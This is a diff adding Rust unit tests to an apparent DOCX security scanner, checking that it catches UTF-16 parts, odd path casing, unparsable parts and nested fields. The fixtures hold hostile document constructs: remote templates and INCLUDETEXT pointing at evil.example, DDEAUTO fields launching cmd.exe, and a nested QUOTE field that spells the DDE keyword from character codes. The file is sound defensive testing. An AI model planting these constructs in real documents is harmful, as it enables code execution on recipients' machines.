@@ -187,3 +187,93 @@ fn clean_docx_with_normal_relationships_has_no_security_findings() {
 
 #[allow(dead_code)]
 fn _unused(_: &Path) {}
+
+// --- 보안 검토 반영: 인코딩, 대소문자·경로, 중첩 필드 ---
+
+fn utf16(text: &str, little: bool) -> Vec<u8> {
+    let mut out = if little { vec![0xFF, 0xFE] } else { vec![0xFE, 0xFF] };
+    for unit in text.encode_utf16() {
+        out.extend(if little { unit.to_le_bytes() } else { unit.to_be_bytes() });
+    }
+    out
+}
+
+fn rels_text(items: &[(&str, &str, bool)]) -> String {
+    String::from_utf8(rels(items)).unwrap()
+}
+
+fn doc_text(body: &str) -> String {
+    String::from_utf8(document(body)).unwrap()
+}
+
+#[test]
+fn utf16_encoded_parts_are_still_inspected() {
+    for little in [true, false] {
+        let r = docx(&[("word/_rels/settings.xml.rels", &utf16(&rels_text(&[("attachedTemplate", "http://evil.example/t.dotm", true)]), little))]);
+        assert_security(&r, "OOXML_REMOTE_TEMPLATE", Severity::Critical);
+        let r = docx(&[("word/document.xml", &utf16(&doc_text(&field(&[" DDEAUTO cmd.exe "])), little))]);
+        assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
+    }
+}
+
+#[test]
+fn valid_utf16_document_is_not_reported_as_malformed() {
+    let r = docx(&[("word/document.xml", &utf16(&doc_text("<w:p><w:r><w:t>본문</w:t></w:r></w:p>"), true))]);
+    assert!(!r.has("MALFORMED_MARKUP") && r.findings.is_empty(), "{:?}", r.findings);
+}
+
+#[test]
+fn utf32_part_cannot_be_inspected_and_is_incomplete() {
+    let mut part = vec![0xFF, 0xFE, 0x00, 0x00];
+    part.extend(b"<\0\0\0w\0\0\0".iter());
+    let r = docx(&[("word/_rels/settings.xml.rels", &part)]);
+    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("UTF-32")), "{:?}", r.reasons);
+}
+
+#[test]
+fn unparsable_relationship_part_makes_the_scan_incomplete_not_silent() {
+    let r = docx(&[("word/_rels/settings.xml.rels", b"<Relationships><Relationship Target=")]);
+    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("settings.xml.rels") && x.contains("parsed")), "{:?}", r.reasons);
+}
+
+#[test]
+fn xml_and_rels_parts_are_inspected_whatever_their_case_or_directory() {
+    let r = docx(&[("Word/_Rels/Settings.Xml.Rels", &rels(&[("attachedTemplate", "http://evil.example/t.dotm", true)]))]);
+    assert_security(&r, "OOXML_REMOTE_TEMPLATE", Severity::Critical);
+    let r = docx(&[("WORD/FOOTER1.XML", &document(&field(&[" DDEAUTO cmd.exe "])))]);
+    assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
+    let r = docx(&[("customXml/item1.xml", &document(&field(&[" DDE cmd.exe "])))]);
+    assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
+    let r = docx(&[("Word/VBAProject.BIN", b"\xD0\xCF\x11\xE0 macro")]);
+    assert_security(&r, "OOXML_VBA_PROJECT", Severity::Critical);
+}
+
+const BEGIN: &str = r#"<w:r><w:fldChar w:fldCharType="begin"/></w:r>"#;
+const END: &str = r#"<w:r><w:fldChar w:fldCharType="end"/></w:r>"#;
+
+fn instr(text: &str) -> String {
+    format!("<w:r><w:instrText>{text}</w:instrText></w:r>")
+}
+
+#[test]
+fn field_whose_keyword_is_computed_by_a_nested_field_is_flagged() {
+    // 바깥 필드의 지시문 맨 앞이 안쪽 필드(QUOTE)의 결과다. 키워드를 숨겨 DDE를 조립하는 방식이다.
+    let body = format!("<w:p>{BEGIN}{BEGIN}{}{END}{}{END}</w:p>", instr(" QUOTE 68 68 69 65 85 84 79 "), instr(" c:\\\\windows\\\\system32\\\\cmd.exe "));
+    let r = docx(&[("word/document.xml", &document(&body))]);
+    assert_security(&r, "OOXML_COMPUTED_FIELD", Severity::High);
+}
+
+#[test]
+fn ordinary_nested_fields_are_not_flagged() {
+    let nested_if = format!("<w:p>{BEGIN}{}{BEGIN}{}{END}{}{END}</w:p>", instr(" IF "), instr(" PAGE "), instr(" > 1 \"a\" \"b\" "));
+    let plain = field(&[" PAGE "]);
+    let r = docx(&[("word/document.xml", &document(&format!("{nested_if}{plain}")))]);
+    assert!(!has_ooxml(&r), "{:?}", r.findings);
+}
+
+#[test]
+fn nested_text_is_included_when_classifying_the_outer_field() {
+    let body = format!("<w:p>{BEGIN}{}{BEGIN}{}{END}{END}</w:p>", instr(" INCLUDETEXT "), instr(" QUOTE \"http://evil.example/x.docx\" "));
+    let r = docx(&[("word/document.xml", &document(&body))]);
+    assert_security(&r, "OOXML_DANGEROUS_FIELD", Severity::High);
+}
